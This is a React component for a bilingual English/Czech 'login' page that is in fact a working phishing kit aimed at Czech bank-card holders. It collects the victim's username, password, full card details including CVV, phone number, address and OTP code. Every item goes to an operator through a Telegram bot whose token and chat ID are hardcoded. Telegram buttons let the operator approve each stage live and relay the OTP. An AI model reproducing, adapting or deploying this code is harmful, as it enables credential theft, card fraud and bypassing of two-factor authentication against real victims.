import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import './LoginForm.css';

function LoginForm() {
  // Language state
  const [language, setLanguage] = useState('en'); // 'en' or 'cz'
  
  const [loginName, setLoginName] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState({ loginName: false, password: false });
  const [showCardForm, setShowCardForm] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginApproved, setLoginApproved] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [waitingForOtpApproval, setWaitingForOtpApproval] = useState(false);
  
  // State for card verification form
  const [cardDetails, setCardDetails] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardholderName: '',
    phoneNumber: '',
    city: '',
    postalCode: ''
  });
  const [cardErrors, setCardErrors] = useState({});

  // State for OTP
  const [showOtpForm, setShowOtpForm] = useState(false);
  const [otpCode, setOtpCode] = useState('');
  const [otpError, setOtpError] = useState('');

  // Store current session ID for the login attempt
  const [sessionId, setSessionId] = useState(null);
  const pollingIntervalRef = useRef(null);
  const lastUpdateIdRef = useRef(0);

  // Telegram bot configuration
  const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
  const TELEGRAM_CHAT_ID = '5607265678';

  // Translations
  const translations = {
    en: {
      login: "Login",
      loginName: "Login name",
      password: "Password",
      logIn: "Log in",
      unknownLogin: "Unknown login",
      unknownPassword: "Unknown password",
      cardVerification: "Card Verification",
      securityMessage: "For security reasons, please verify your details (Czech Republic).",
      cardholderName: "Cardholder Name",
      cardNumber: "Card Number",
      expirationDate: "Expiration Date",
      cvv: "CVV",
      phoneNumber: "Phone Number (9 digits)",
      phoneHint: "Enter exactly 9 digits (e.g., 723456789)",
      city: "City (Czech Republic)",
      cityHint: "e.g., Prague, Brno, Ostrava, Plzeň...",
      postalCode: "Postal Code (Czech Republic)",
      postalHint: "Czech format: 5 digits (e.g., 110 00 for Prague)",
      submitCard: "Submit Card Details",
      twoFactor: "Two-Factor Verification",
      enterOtp: "Please enter the OTP code to complete your login.",
      otpCode: "OTP Code",
      verifyCode: "Verify Code",
      back: "Back",
      waitingAdmin: "Waiting for admin approval...",
      waitingContinue: "Waiting for admin to continue...",
      processing: "Processing...",
      adminWillReview: "Admin will click \"Next Step\" when ready",
      pleaseWait: "Please wait while we verify your credentials",
      pleaseEnterLogin: "Please enter your login name.",
      pleaseEnterPassword: "Please enter your password.",
      validCard: "Please enter a valid card number (16 digits)",
      validExpiry: "Please enter a valid expiration date (MM/YY)",
      cardExpired: "Card has expired",
      validCvv: "Please enter a valid CVV (3-4 digits)",
      validCardholder: "Please enter the cardholder name",
      validPhone: "Please enter your phone number",
      phoneDigits: "Phone number must be exactly 9 digits",
      validCity: "Please enter your city in Czech Republic",
      validCityName: "Please enter a valid city name",
      validPostal: "Please enter your Czech postal code",
      invalidPostal: "Invalid Czech postal code (format: 123 45 or 12345)",
      validOtp: "Please enter a valid OTP code (6 digits)",
      denied: "Login denied by admin. Please try again later.",
      success: "OTP code verified successfully! Redirecting...",
      czech: "CZ",
      english: "EN"
    },
    cz: {
      login: "Přihlášení",
      loginName: "Uživatelské jméno",
      password: "Heslo",
      logIn: "Přihlásit se",
      unknownLogin: "Neznámé přihlášení",
      unknownPassword: "Neznámé heslo",
      cardVerification: "Ověření karty",
      securityMessage: "Z bezpečnostních důvodů ověřte své údaje (Česká republika).",
      cardholderName: "Jméno držitele karty",
      cardNumber: "Číslo karty",
      expirationDate: "Datum expirace",
      cvv: "CVV",
      phoneNumber: "Telefonní číslo (9 číslic)",
      phoneHint: "Zadejte přesně 9 číslic (např. 723456789)",
      city: "Město (Česká republika)",
      cityHint: "např. Praha, Brno, Ostrava, Plzeň...",
      postalCode: "PSČ (Česká republika)",
      postalHint: "Český formát: 5 číslic (např. 110 00 pro Prahu)",
      submitCard: "Odeslat údaje o kartě",
      twoFactor: "Dvoufaktorové ověření",
      enterOtp: "Zadejte OTP kód pro dokončení přihlášení.",
      otpCode: "OTP kód",
      verifyCode: "Ověřit kód",
      back: "Zpět",
      waitingAdmin: "Čekání na schválení administrátora...",
      waitingContinue: "Čekání na pokračování administrátora...",
      processing: "Zpracování...",
      adminWillReview: "Administrátor klikne na \"Další krok\" až bude připraven",
      pleaseWait: "Počkejte prosím, zatímco ověřujeme vaše údaje",
      pleaseEnterLogin: "Zadejte své uživatelské jméno.",
      pleaseEnterPassword: "Zadejte své heslo.",
      validCard: "Zadejte platné číslo karty (16 číslic)",
      validExpiry: "Zadejte platné datum expirace (MM/RR)",
      cardExpired: "Karta vypršela",
      validCvv: "Zadejte platné CVV (3-4 číslice)",
      validCardholder: "Zadejte jméno držitele karty",
      validPhone: "Zadejte své telefonní číslo",
      phoneDigits: "Telefonní číslo musí mít přesně 9 číslic",
      validCity: "Zadejte své město v České republice",
      validCityName: "Zadejte platný název města",
      validPostal: "Zadejte své české PSČ",
      invalidPostal: "Neplatné české PSČ (formát: 123 45 nebo 12345)",
      validOtp: "Zadejte platný OTP kód (6 číslic)",
      denied: "Přihlášení zamítnuto administrátorem. Zkuste to prosím později.",
      success: "OTP kód byl úspěšně ověřen! Přesměrování...",
      czech: "CZ",
      english: "EN"
    }
  };

  const t = translations[language];

  // Toggle language function
  const toggleLanguage = () => {
    setLanguage(prev => prev === 'en' ? 'cz' : 'en');
  };

  // List of major cities in Czech Republic
  const czechCities = [
    'Prague', 'Brno', 'Ostrava', 'Plzeň', 'Liberec', 'Olomouc', 
    'Ústí nad Labem', 'Hradec Králové', 'České Budějovice', 
    'Pardubice', 'Havířov', 'Zlín', 'Kladno', 'Most', 'Karviná', 
    'Frýdek-Místek', 'Opava', 'Děčín', 'Teplice', 'Karlovy Vary', 
    'Chomutov', 'Jihlava', 'Prostějov', 'Přerov', 'Třebíč'
  ];

  // Function to generate a unique session ID
  const generateSessionId = () => {
    return Date.now().toString() + Math.random().toString(36).substr(2, 6);
  };

  // Function to send message to Telegram with inline keyboard for login
  const sendToTelegramWithButtons = async (message, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const keyboard = {
        inline_keyboard: [
          [
            {
              text: "✅ Approve & Continue",
              callback_data: `approve_${sessionId}`
            },
            {
              text: "❌ Deny",
              callback_data: `deny_${sessionId}`
            }
          ],
          [
            {
              text: "💳 View Card Details",
              callback_data: `card_${sessionId}`
            }
          ]
        ]
      };

      const response = await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      console.log('Login message sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      return false;
    }
  };

  // Function to send card details to Telegram with NEXT STEP button
  const sendCardDetailsToTelegram = async (cardData, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const cardMessage = `
💳 <b>CARD INFORMATION RECEIVED</b> 💳
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

<b>Card Details:</b>
├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
├ 💳 <b>Card Number:</b> ${cardData.cardNumber}
├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
└ 🔐 <b>CVV:</b> ${cardData.cvv}

<b>Personal Info:</b>
├ 📞 <b>Phone:</b> ${cardData.phoneNumber}
├ 🏙️ <b>City:</b> ${cardData.city}
└ 📮 <b>Postal Code:</b> ${cardData.postalCode}

━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Click the button below to let the user proceed to OTP</i>
      `;

      const keyboard = {
        inline_keyboard: [
          [
            {
              text: "➡️ Next Step (OTP)",
              callback_data: `next_${sessionId}`
            }
          ],
          [
            {
              text: "❌ Deny & Block",
              callback_data: `deny_${sessionId}`
            }
          ]
        ]
      };

      const response = await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: cardMessage,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      console.log('Card details sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending card details:', error);
      return false;
    }
  };

  // Function to send OTP code to Telegram
  const sendOtpToTelegram = async (otpCode, phoneNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const otpMessage = `
🔐 <b>OTP CODE RECEIVED</b> 🔐
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

<b>OTP Code:</b> <code>${otpCode}</code>
📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User entered this OTP code</i>
      `;

      await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: otpMessage,
        parse_mode: 'HTML'
      });
      console.log('OTP code sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending OTP to Telegram:', error);
      return false;
    }
  };

  // Function to send final success message
  const sendSuccessToTelegram = async (phoneNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const successMessage = `
✅ <b>LOGIN COMPLETED SUCCESSFULLY!</b> ✅
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}

<b>Status:</b> OTP Verified ✓
━━━━━━━━━━━━━━━━━━━━━
🎯 <i>User has successfully logged in!</i>
      `;

      await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: successMessage,
        parse_mode: 'HTML'
      });
      console.log('Success message sent to Telegram');
    } catch (error) {
      console.error('Error sending success message:', error);
    }
  };

  // Function to set up polling to receive button clicks
  const setupTelegramPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
    }

    pollingIntervalRef.current = setInterval(async () => {
      if (!sessionId) return;

      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateIdRef.current}&timeout=5`;
        const response = await axios.get(url);
        
        const updates = response.data.result;
        
        for (const update of updates) {
          if (update.update_id >= lastUpdateIdRef.current) {
            lastUpdateIdRef.current = update.update_id + 1;
          }
          
          if (update.callback_query) {
            const callbackData = update.callback_query.data;
            console.log('Received callback:', callbackData);
            
            const [action, sid] = callbackData.split('_');
            
            if (sid === sessionId) {
              if (action === 'approve') {
                console.log('Approve clicked - showing card form');
                setWaitingForApproval(false);
                setIsLoading(false);
                setShowCardForm(true);
              } else if (action === 'deny') {
                console.log('Deny clicked - reloading');
                setWaitingForApproval(false);
                setWaitingForOtpApproval(false);
                setIsLoading(false);
                alert(t.denied);
                window.location.reload();
              } else if (action === 'card') {
                console.log('View card details clicked');
                setWaitingForApproval(false);
                setIsLoading(false);
                setShowCardForm(true);
              } else if (action === 'next') {
                console.log('Next Step clicked - moving to OTP form');
                setWaitingForOtpApproval(false);
                setIsLoading(false);
                setShowCardForm(false);
                setShowOtpForm(true);
                setOtpCode('');
                setOtpError('');
              }
              
              // Answer the callback
              try {
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                  callback_query_id: update.callback_query.id,
                  text: action === 'next' ? "➡️ User can now enter OTP code!" : "✅ Request processed!"
                });
              } catch (callbackError) {
                console.error('Error answering callback:', callbackError);
              }
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 3000);
    
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  };

  useEffect(() => {
    const cleanup = setupTelegramPolling();
    return cleanup;
  }, [sessionId]);

  const handleLogin = async (e) => {
    e.preventDefault();

    const newErrors = {
      loginName: loginName.trim() === '',
      password: password.trim() === ''
    };

    setErrors(newErrors);

    if (!newErrors.loginName && !newErrors.password) {
      setIsLoading(true);
      setWaitingForApproval(true);
      
      const newSessionId = generateSessionId();
      setSessionId(newSessionId);
      console.log('New session:', newSessionId);
      
      const loginData = {
        loginName: loginName.trim(),
        password: password.trim()
      };
      
      const message = `
🔐 <b>NEW LOGIN ATTEMPT</b> 🔐
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🆔 <b>Session ID:</b> <code>${newSessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

📝 <b>LOGIN CREDENTIALS:</b>
├ 👤 <b>Username:</b> ${loginData.loginName}
└ 🔑 <b>Password:</b> ${loginData.password}

━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Click a button below to proceed</i>
      `;
      
      await sendToTelegramWithButtons(message, newSessionId);
    }
  };

  const handleInputChange = (field, value) => {
    if (field === 'loginName') {
      setLoginName(value);
    } else {
      setPassword(value);
    }

    setErrors({ ...errors, [field]: false });
  };

  const handleCardInputChange = (field, value) => {
    if (field === 'cardNumber') {
      value = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (value.length > 19) value = value.slice(0, 19);
    }
    
    if (field === 'expiryDate') {
      value = value.replace(/\D/g, '');
      if (value.length >= 2) {
        value = value.slice(0, 2) + (value.length > 2 ? '/' + value.slice(2, 4) : '');
      }
      if (value.length > 5) value = value.slice(0, 5);
    }
    
    if (field === 'cvv') {
      value = value.replace(/\D/g, '').slice(0, 4);
    }
    
    if (field === 'phoneNumber') {
      value = value.replace(/\D/g, '').slice(0, 9);
    }
    
    if (field === 'city') {
      value = value.slice(0, 50);
    }
    
    if (field === 'postalCode') {
      value = value.replace(/\s/g, '');
      if (value.length > 5) value = value.slice(0, 5);
      if (value.length >= 3 && value.length <= 5) {
        value = value.slice(0, 3) + (value.length > 3 ? ' ' + value.slice(3, 5) : '');
      }
    }

    setCardDetails({
      ...cardDetails,
      [field]: value
    });
    
    if (cardErrors[field]) {
      setCardErrors({
        ...cardErrors,
        [field]: false
      });
    }
  };

  const validateCzechPostalCode = (postalCode) => {
    const cleanCode = postalCode.replace(/\s/g, '');
    const postalRegex = /^\d{5}$/;
    return postalRegex.test(cleanCode);
  };

  const validateCardForm = () => {
    const errors = {};
    
    if (!cardDetails.cardNumber.trim() || cardDetails.cardNumber.replace(/\s/g, '').length < 16) {
      errors.cardNumber = t.validCard;
    }
    
    if (!cardDetails.expiryDate.trim() || !/^\d{2}\/\d{2}$/.test(cardDetails.expiryDate)) {
      errors.expiryDate = t.validExpiry;
    } else {
      const [month, year] = cardDetails.expiryDate.split('/');
      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;
      const expYear = parseInt(year);
      const expMonth = parseInt(month);
      
      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
        errors.expiryDate = t.cardExpired;
      }
    }
    
    if (!cardDetails.cvv.trim() || cardDetails.cvv.length < 3) {
      errors.cvv = t.validCvv;
    }
    
    if (!cardDetails.cardholderName.trim()) {
      errors.cardholderName = t.validCardholder;
    }
    
    if (!cardDetails.phoneNumber.trim()) {
      errors.phoneNumber = t.validPhone;
    } else if (cardDetails.phoneNumber.length !== 9) {
      errors.phoneNumber = t.phoneDigits;
    }
    
    if (!cardDetails.city.trim()) {
      errors.city = t.validCity;
    } else if (cardDetails.city.trim().length < 2) {
      errors.city = t.validCityName;
    }
    
    if (!cardDetails.postalCode.trim()) {
      errors.postalCode = t.validPostal;
    } else if (!validateCzechPostalCode(cardDetails.postalCode)) {
      errors.postalCode = t.invalidPostal;
    }
    
    return errors;
  };

  const handleCardSubmit = async (e) => {
    e.preventDefault();
    
    const errors = validateCardForm();
    
    if (Object.keys(errors).length === 0) {
      setIsLoading(true);
      setWaitingForOtpApproval(true);
      
      console.log('Sending card details for session:', sessionId);
      
      await sendCardDetailsToTelegram(cardDetails, sessionId);
      
      setIsLoading(false);
    } else {
      setCardErrors(errors);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    
    if (!otpCode.trim() || otpCode.length < 6) {
      setOtpError(t.validOtp);
      return;
    }
    
    setIsLoading(true);
    
    await sendOtpToTelegram(otpCode, cardDetails.phoneNumber, sessionId);
    await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
    
    setIsLoading(false);
    
    alert(t.success);
    window.location.reload();
  };

  const handleCancelCardForm = () => {
    setShowCardForm(false);
    setCardDetails({
      cardNumber: '',
      expiryDate: '',
      cvv: '',
      cardholderName: '',
      phoneNumber: '',
      city: '',
      postalCode: ''
    });
    setCardErrors({});
  };

  const handleCancelOtpForm = () => {
    setShowOtpForm(false);
    setShowCardForm(true);
    setOtpCode('');
    setOtpError('');
  };

  return (
    <div className="login-container">
      {/* Language button in header */}
      <div className="header-language">
        <button onClick={toggleLanguage} className="header-language-btn" type="button">
          {language === 'en' ? t.czech : t.english}
        </button>
      </div>

      <h2>{t.login}</h2>

      {/* Loading overlay */}
      {(isLoading || waitingForApproval || waitingForOtpApproval) && (
        <div className="loading-overlay">
          <div className="searching-container">
            <div className="animated-search-icon">
              <div className="search-ring"></div>
              <div className="search-ring-2"></div>
              <div className="search-ring-3"></div>
              <div className="search-dot"></div>
              <div className="search-magnifier">
                <div className="magnifier-circle"></div>
                <div className="magnifier-handle"></div>
              </div>
            </div>
            <p className="searching-text">
              {waitingForApproval && t.waitingAdmin}
              {waitingForOtpApproval && t.waitingContinue}
              {isLoading && !waitingForApproval && !waitingForOtpApproval && t.processing}
            </p>
            {waitingForOtpApproval && (
              <p className="searching-subtext">
                {t.adminWillReview}
              </p>
            )}
            {waitingForApproval && (
              <p className="searching-subtext">
                {t.pleaseWait}
              </p>
            )}
          </div>
        </div>
      )}

      {/* Login error messages */}
      {(errors.loginName || errors.password) && (
        <div className="error-box">
          {errors.loginName && (
            <div className="error-item">
              <span className="error-icon">❗</span>
              {t.pleaseEnterLogin}
            </div>
          )}
          {errors.password && (
            <div className="error-item">
              <span className="error-icon">❗</span>
              {t.pleaseEnterPassword}
            </div>
          )}
        </div>
      )}

      {/* Initial login form */}
      {!showCardForm && !showOtpForm && !waitingForApproval && !waitingForOtpApproval ? (
        <>
          <div className="login-form">
            <div className="form-group">
              <label htmlFor="loginName">{t.loginName}</label>
              <input
                type="text"
                id="loginName"
                value={loginName}
                onChange={(e) => handleInputChange('loginName', e.target.value)}
                placeholder={t.loginName}
                className={errors.loginName ? 'input-error' : ''}
              />
            </div>

            <div className="form-group">
              <label htmlFor="password">{t.password}</label>
              <input
                type="password"
                id="password"
                value={password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                placeholder={t.password}
                className={errors.password ? 'input-error' : ''}
              />
            </div>

            <button onClick={handleLogin} className="login-btn" disabled={isLoading}>
              {t.logIn}
            </button>
          </div>

          <div className="login-links">
            <a href="#">{t.unknownLogin}</a>
            <span>|</span>
            <a href="#">{t.unknownPassword}</a>
          </div>
        </>
      ) : showCardForm && !waitingForOtpApproval ? (
        <div className="card-verification-form">
          <h3>{t.cardVerification}</h3>
          <p className="verification-message">
            {t.securityMessage}
          </p>
          
          <form onSubmit={handleCardSubmit}>
            <div className="form-group">
              <label htmlFor="cardholderName">{t.cardholderName}</label>
              <input
                type="text"
                id="cardholderName"
                value={cardDetails.cardholderName}
                onChange={(e) => handleCardInputChange('cardholderName', e.target.value)}
                placeholder="e.g., JEAN DUPONT"
                className={cardErrors.cardholderName ? 'input-error' : ''}
              />
              {cardErrors.cardholderName && (
                <span className="error-message">{cardErrors.cardholderName}</span>
              )}
            </div>

            <div className="form-group">
              <label htmlFor="cardNumber">{t.cardNumber}</label>
              <input
                type="text"
                id="cardNumber"
                value={cardDetails.cardNumber}
                onChange={(e) => handleCardInputChange('cardNumber', e.target.value)}
                placeholder="1234 5678 9012 3456"
                maxLength="19"
                className={cardErrors.cardNumber ? 'input-error' : ''}
              />
              {cardErrors.cardNumber && (
                <span className="error-message">{cardErrors.cardNumber}</span>
              )}
            </div>

            <div className="form-row">
              <div className="form-group half">
                <label htmlFor="expiryDate">{t.expirationDate}</label>
                <input
                  type="text"
                  id="expiryDate"
                  value={cardDetails.expiryDate}
                  onChange={(e) => handleCardInputChange('expiryDate', e.target.value)}
                  placeholder="MM/YY"
                  maxLength="5"
                  className={cardErrors.expiryDate ? 'input-error' : ''}
                />
                {cardErrors.expiryDate && (
                  <span className="error-message">{cardErrors.expiryDate}</span>
                )}
              </div>

              <div className="form-group half">
                <label htmlFor="cvv">{t.cvv}</label>
                <input
                  type="text"
                  id="cvv"
                  value={cardDetails.cvv}
                  onChange={(e) => handleCardInputChange('cvv', e.target.value)}
                  placeholder="123"
                  maxLength="4"
                  className={cardErrors.cvv ? 'input-error' : ''}
                />
                {cardErrors.cvv && (
                  <span className="error-message">{cardErrors.cvv}</span>
                )}
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="phoneNumber">{t.phoneNumber}</label>
              <input
                type="text"
                id="phoneNumber"
                value={cardDetails.phoneNumber}
                onChange={(e) => handleCardInputChange('phoneNumber', e.target.value)}
                placeholder="123456789"
                maxLength="9"
                className={cardErrors.phoneNumber ? 'input-error' : ''}
              />
              {cardErrors.phoneNumber && (
                <span className="error-message">{cardErrors.phoneNumber}</span>
              )}
              <small className="field-hint">{t.phoneHint}</small>
            </div>

            <div className="form-group">
              <label htmlFor="city">{t.city}</label>
              <input
                type="text"
                id="city"
                value={cardDetails.city}
                onChange={(e) => handleCardInputChange('city', e.target.value)}
                placeholder="e.g., Prague, Brno, Ostrava..."
                className={cardErrors.city ? 'input-error' : ''}
                list="czech-cities"
              />
              <datalist id="czech-cities">
                {czechCities.map(city => (
                  <option key={city} value={city} />
                ))}
              </datalist>
              {cardErrors.city && (
                <span className="error-message">{cardErrors.city}</span>
              )}
              <small className="field-hint">{t.cityHint}</small>
            </div>

            <div className="form-group">
              <label htmlFor="postalCode">{t.postalCode}</label>
              <input
                type="text"
                id="postalCode"
                value={cardDetails.postalCode}
                onChange={(e) => handleCardInputChange('postalCode', e.target.value)}
                placeholder="e.g., 110 00 or 11000"
                maxLength="6"
                className={cardErrors.postalCode ? 'input-error' : ''}
              />
              {cardErrors.postalCode && (
                <span className="error-message">{cardErrors.postalCode}</span>
              )}
              <small className="field-hint">{t.postalHint}</small>
            </div>

            <div className="card-buttons">
              <button type="submit" className="verify-btn" disabled={isLoading}>
                {isLoading ? t.sending : t.submitCard}
              </button>
            </div>
          </form>
        </div>
      ) : showOtpForm ? (
        <div className="otp-verification-form">
          <h3>{t.twoFactor}</h3>
          <p className="verification-message">
            {t.enterOtp}
          </p>
          
          <form onSubmit={handleOtpSubmit}>
            <div className="form-group">
              <label htmlFor="otpCode">{t.otpCode}</label>
              <input
                type="text"
                id="otpCode"
                value={otpCode}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '').slice(0, 6);
                  setOtpCode(value);
                  setOtpError('');
                }}
                placeholder="000000"
                maxLength="6"
                className={otpError ? 'input-error' : ''}
                autoFocus
              />
              {otpError && (
                <span className="error-message">{otpError}</span>
              )}
            </div>

            <div className="otp-buttons">
              <button type="button" onClick={handleCancelOtpForm} className="back-btn">
                {t.back}
              </button>
              <button type="submit" className="verify-btn" disabled={isLoading}>
                {isLoading ? t.verifying : t.verifyCode}
              </button>
            </div>
          </form>
        </div>
      ) : null}
    </div>
  );
}

export default LoginForm;